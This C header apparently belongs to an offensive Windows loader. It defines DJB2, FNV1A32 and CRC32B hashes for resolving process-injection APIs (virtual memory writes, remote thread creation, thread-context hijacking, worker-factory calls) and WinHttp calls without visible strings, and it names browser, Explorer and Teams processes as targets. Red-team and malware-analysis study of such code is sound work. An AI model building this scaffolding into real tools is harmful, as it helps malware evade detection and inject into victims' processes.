#pragma once
#ifndef DEFINES_H
#define DEFINES_H

#include <Config.h>
#include <common/Macros.h>
#include <core/Hash.h>

#define OPT


#if ( defined( API_HASHING ) && ( API_HASHING == TRUE ) )

    #if ( defined( DJB2 ) && ( DJB2 == TRUE ) )
   /******************************************
    *    DJB2    -> Module and API Hashes    *
    ******************************************/
    #undef DJB2

    #define H_EXE_MSEDGE_DJB2 0xFC03F76A
    #define H_EXE_NOTEPAD_DJB2 0x5E3A79E0
    #define H_EXE_EXPLORER_DJB2 0x71AA8326
    #define H_EXE_TEAMS_DJB2 0x1DCF016F

    #define H_DLL_NTDLL_DJB2 0x1EDAB0ED
    #define H_DLL_WIN32U_DJB2 0x9968D8D7
    #define H_DLL_KERNEL32_DJB2 0x6DDB9555
    #define H_DLL_WINHTTP_DJB2 0x612C623D

    #define H_API_TppWorkerThread_DJB2 0x0DD5558B
    #define H_API_NtWaitForWorkViaWorkerFactory_DJB2 0xC2BE4952
    #define H_API_NtUserMessageCall_DJB2 0xFC08ABA7
    #define H_API_LdrLoadDll_DJB2 0x0307DB23
    #define H_API_LdrGetProcedureAddress_DJB2 0x2E5A99F6
    #define H_API_RtlAllocateHeap_DJB2 0xC0B381DA
    #define H_API_RtlReAllocateHeap_DJB2 0xBBC97911
    #define H_API_RtlFreeHeap_DJB2 0x70BA71D7
    #define H_API_NtQuerySystemInformation_DJB2 0xEE4F73A8
    #define H_API_NtOpenProcess_DJB2 0x5003C058
    #define H_API_NtAllocateVirtualMemory_DJB2 0x6793C34C
    #define H_API_NtWriteVirtualMemory_DJB2 0x95F3A792
    #define H_API_NtProtectVirtualMemory_DJB2 0x082962C8
    #define H_API_NtCreateThreadEx_DJB2 0xCB0C2130
    #define H_API_NtGetContextThread_DJB2 0x9E0E1A44
    #define H_API_NtSetContextThread_DJB2 0x308BE0D0
    #define H_API_NtResumeThread_DJB2 0x2C7B3D30
    #define H_API_NtWaitForSingleObject_DJB2 0x4C6DC63C
    #define H_API_NtTerminateThread_DJB2 0xAC3C9DC8
    #define H_API_NtTerminateProcess_DJB2 0x1703AB2F
    #define H_API_NtClose_DJB2 0x8B8E133D
    #define H_API_CreateThread_DJB2 0x7F08F451
    #define H_API_Sleep_DJB2 0x0E19E5FE
    #define H_API_WinHttpOpen_DJB2 0x5E4F39E5
    #define H_API_WinHttpConnect_DJB2 0x7242C17D
    #define H_API_WinHttpOpenRequest_DJB2 0xEAB7B9CE
    #define H_API_WinHttpSetOption_DJB2 0xA18B94F8
    #define H_API_WinHttpSendRequest_DJB2 0xB183FAA6
    #define H_API_WinHttpReceiveResponse_DJB2 0x146C4925
    #define H_API_WinHttpQueryHeaders_DJB2 0x389CEFA5
    #define H_API_WinHttpReadData_DJB2 0x7195E4E9
    #define H_API_WinHttpCloseHandle_DJB2 0x36220CD5

    #elif ( defined( FNV1A32 ) && ( FNV1A32 == TRUE ) )
   /******************************************
    *    FNV1A32 -> Module and API Hashes    *
    ******************************************/
    #undef FNV1A32
    
    #define H_EXE_MSEDGE_FNV1A32 0xAA3441F6
    #define H_EXE_NOTEPAD_FNV1A32 0xFBC42BAC
    #define H_EXE_EXPLORER_FNV1A32 0x38935404
    #define H_EXE_TEAMS_FNV1A32 0xEAB52A33

    #define H_DLL_NTDLL_FNV1A32 0x145370BB
    #define H_DLL_WIN32U_FNV1A32 0x82F1E7E9
    #define H_DLL_KERNEL32_FNV1A32 0x29CDD463
    #define H_DLL_WINHTTP_FNV1A32 0xD7735323

    #define H_API_TppWorkerThread_FNV1A32 0x23536B45
    #define H_API_NtWaitForWorkViaWorkerFactory_FNV1A32 0x5BBCC658
    #define H_API_NtUserMessageCall_FNV1A32 0xA9D6A43B
    #define H_API_LdrLoadDll_FNV1A32 0x7B566B5F
    #define H_API_LdrGetProcedureAddress_FNV1A32 0x1478F484
    #define H_API_RtlAllocateHeap_FNV1A32 0xB3F819F8
    #define H_API_RtlReAllocateHeap_FNV1A32 0xA05AB779
    #define H_API_RtlFreeHeap_FNV1A32 0x7C76ECF5
    #define H_API_NtQuerySystemInformation_FNV1A32 0x7A43974A
    #define H_API_NtOpenProcess_FNV1A32 0x5EA49A38
    #define H_API_NtAllocateVirtualMemory_FNV1A32 0xCA67B978
    #define H_API_NtWriteVirtualMemory_FNV1A32 0x43E32F32
    #define H_API_NtProtectVirtualMemory_FNV1A32 0xBD799926
    #define H_API_NtCreateThreadEx_FNV1A32 0xED0594DA
    #define H_API_NtGetContextThread_FNV1A32 0x65ECAF30
    #define H_API_NtSetContextThread_FNV1A32 0xEA61D9E4
    #define H_API_NtResumeThread_FNV1A32 0xE06437FC
    #define H_API_NtWaitForSingleObject_FNV1A32 0xB073C52E
    #define H_API_NtTerminateThread_FNV1A32 0x5D7DA25E
    #define H_API_NtTerminateProcess_FNV1A32 0x1F2F8E87
    #define H_API_NtClose_FNV1A32 0x6B372C05
    #define H_API_CreateThread_FNV1A32 0x60AC7E39
    #define H_API_Sleep_FNV1A32 0x2FA62CA8
    #define H_API_WinHttpOpen_FNV1A32 0xAEBC83A5
    #define H_API_WinHttpConnect_FNV1A32 0xB0B51A4D
    #define H_API_WinHttpOpenRequest_FNV1A32 0x1552DF72
    #define H_API_WinHttpSetOption_FNV1A32 0xA64F42FA
    #define H_API_WinHttpSendRequest_FNV1A32 0xE0CFB564
    #define H_API_WinHttpReceiveResponse_FNV1A32 0xEC3C8021
    #define H_API_WinHttpQueryHeaders_FNV1A32 0x437AA28F
    #define H_API_WinHttpReadData_FNV1A32 0x943A5129
    #define H_API_WinHttpCloseHandle_FNV1A32 0xD2053A99

    #elif ( defined( CRC32B ) && ( CRC32B == TRUE ) ) 
   /******************************************
    *    CRC32B  -> Module and API Hashes    *
    ******************************************/
    #undef CRC32B

    #define H_EXE_MSEDGE_CRC32B 0xD20E1CBE
    #define H_EXE_NOTEPAD_CRC32B 0xC6013849
    #define H_EXE_EXPLORER_CRC32B 0x8B03967B
    #define H_EXE_TEAMS_CRC32B 0xC4ABEF5C

    #define H_DLL_NTDLL_CRC32B 0x6030EF91
    #define H_DLL_WIN32U_CRC32B 0xC27639B5
    #define H_DLL_KERNEL32_CRC32B 0x998B531E
    #define H_DLL_WINHTTP_CRC32B 0xD8CBECC1

    #define H_API_TppWorkerThread_CRC32B 0x405A511D
    #define H_API_NtWaitForWorkViaWorkerFactory_CRC32B 0x285A6EEC
    #define H_API_NtUserMessageCall_CRC32B 0xCB9E046D
    #define H_API_LdrLoadDll_CRC32B 0x183679F2
    #define H_API_LdrGetProcedureAddress_CRC32B 0xB64C13EE
    #define H_API_RtlAllocateHeap_CRC32B 0xA1D45974
    #define H_API_RtlReAllocateHeap_CRC32B 0xB973B8DC
    #define H_API_RtlFreeHeap_CRC32B 0xAF11BC24
    #define H_API_NtQuerySystemInformation_CRC32B 0x97FD2398
    #define H_API_NtOpenProcess_CRC32B 0xDBF381B5
    #define H_API_NtAllocateVirtualMemory_CRC32B 0xE0762FEB
    #define H_API_NtWriteVirtualMemory_CRC32B 0xE4879939
    #define H_API_NtProtectVirtualMemory_CRC32B 0x5C2D1A97
    #define H_API_NtCreateThreadEx_CRC32B 0x2073465A
    #define H_API_NtGetContextThread_CRC32B 0xD3534981
    #define H_API_NtSetContextThread_CRC32B 0xE1453B98
    #define H_API_NtResumeThread_CRC32B 0x6273B572
    #define H_API_NtWaitForSingleObject_CRC32B 0xDD554681
    #define H_API_NtTerminateThread_CRC32B 0x67614ADA
    #define H_API_NtTerminateProcess_CRC32B 0x94FCB0C0
    #define H_API_NtClose_CRC32B 0x0D09C750
    #define H_API_CreateThread_CRC32B 0x906A06B0
    #define H_API_Sleep_CRC32B 0xCEF2EDA8
    #define H_API_WinHttpOpen_CRC32B 0x2D697D39
    #define H_API_WinHttpConnect_CRC32B 0x6F50B6C6
    #define H_API_WinHttpOpenRequest_CRC32B 0xB8172A42
    #define H_API_WinHttpSetOption_CRC32B 0xF57A2CB4
    #define H_API_WinHttpSendRequest_CRC32B 0xCEE9B4F7
    #define H_API_WinHttpReceiveResponse_CRC32B 0x46BB61F9
    #define H_API_WinHttpQueryHeaders_CRC32B 0xACF293EA
    #define H_API_WinHttpReadData_CRC32B 0x2E5251CA
    #define H_API_WinHttpCloseHandle_CRC32B 0x6A29F9F4

    #endif
///////////////////////////////////////////////////////////////////////////////
#define H_EXE_( Name, HashAlg ) H_CAT_( H_EXE, Name, HashAlg )
#define H_DLL_( Name, HashAlg ) H_CAT_( H_DLL, Name, HashAlg )
#define H_API_( Name, HashAlg ) H_CAT_( H_API, Name, HashAlg )

#define H_EXE( Name ) H_EXE_( Name, HASH_ALG )
#define H_DLL( Name ) H_DLL_( Name, HASH_ALG )
#define H_API( Name ) H_API_( Name, HASH_ALG ) 

#else
    #define H_EXE( Name, IGNORE ) WSTRCAT_( Name, .EXE )
    #define H_DLL( Name, IGNORE ) WSTRCAT_( Name, .DLL )
    #define H_API( Name, IGNORE ) #Name
#endif// API_HASHING == TRUE


#define H_TARGET_PROCESS    H_EXE_( TARGET_PROCESS, HASH_ALG )


#define H_DLL_NTDLL         H_DLL_( NTDLL,    HASH_ALG )
#define H_DLL_WIN32U        H_DLL_( WIN32U,   HASH_ALG )
#define H_DLL_KERNEL32      H_DLL_( KERNEL32, HASH_ALG )
#define H_DLL_WINHTTP       H_DLL_( WINHTTP,  HASH_ALG )


#endif // DEFINES_H
